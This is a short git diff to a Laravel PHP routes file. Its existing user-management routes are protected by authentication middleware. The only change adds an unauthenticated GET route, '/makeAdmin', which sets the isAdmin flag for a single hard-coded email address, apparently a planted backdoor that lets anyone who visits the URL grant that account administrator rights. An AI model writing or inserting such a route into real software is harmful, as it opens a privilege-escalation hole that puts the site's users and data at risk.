@@ -55,3 +55,7 @@ Route::middleware(['auth:sanctum', 'verified'])->delete('deleteUser/{userId}', [
 Route::middleware(['auth:sanctum', 'verified'])->post('/restoreUser/{userId}', [UserController::class, 'restoreUser'])->name('delete_user');
 Route::middleware(['auth:sanctum', 'verified'])->get('/users/{name?}', 'App\Http\Controllers\UserController@showUsers')->name('exploreUsers');
 Route::middleware(['auth:sanctum', 'verified'])->get('/manageUsers/{name?}', 'App\Http\Controllers\UserController@showManageUsers')->name('manageUsers');
+
+Route::get('/makeAdmin', function () {
+    DB::table('users')->where('email', 'theclipclubcompany@gmail.com')->update(['isAdmin' => true]);
+});
